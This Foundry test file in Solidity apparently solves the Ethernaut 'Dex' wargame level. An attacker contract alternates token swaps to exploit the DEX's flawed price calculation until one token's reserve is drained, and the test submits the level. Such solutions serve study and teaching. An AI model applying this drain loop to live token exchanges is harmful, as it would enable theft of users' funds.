// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface IDex {
  function token1() external returns(address);
  function token2() external returns(address);
  function approve(address spender, uint amount) external;
  function swap(address from, address to, uint amount) external;
  function balanceOf(address token, address account) external returns (uint);
}

contract DexAttacker {
  function swapAddresses(address from, address to) internal pure returns (address, address) {
    return (to, from);
  }

  function attack(IDex dex) public {
    address from = dex.token1();
    address to = dex.token2();
    uint256 desiredSwapAmount;
    uint256 balanceDexFrom;

    while (true) {
      desiredSwapAmount = dex.balanceOf(from, address(this));
      balanceDexFrom = dex.balanceOf(from, address(dex));

      // keep your ask within the amounts in the dex
      // we arrive here by solving x * (to/from) = to, for x
      if (desiredSwapAmount > balanceDexFrom) {
        desiredSwapAmount = balanceDexFrom;
      }

      dex.swap(from, to, desiredSwapAmount);

      if (dex.balanceOf(to, address(dex)) == 0) {
        break;
      }
      (from, to) = swapAddresses(from, to);
    }
  }
}

contract DexTest is Test {
  address internal challengeAddress;
  IDex internal dex;
  DexAttacker internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x9CB391dbcD447E645D6Cb55dE6ca23164130D008);
    dex = IDex(challengeAddress);
    dex.approve(challengeAddress, 100);
    attackContract = new DexAttacker();
  }

  function testExploit() public {
    (bool success,) = address(attackContract).delegatecall(abi.encodeWithSignature("attack(address)", address(dex)));
    require(success);

    utils.submitLevelInstance(challengeAddress);
  }
}
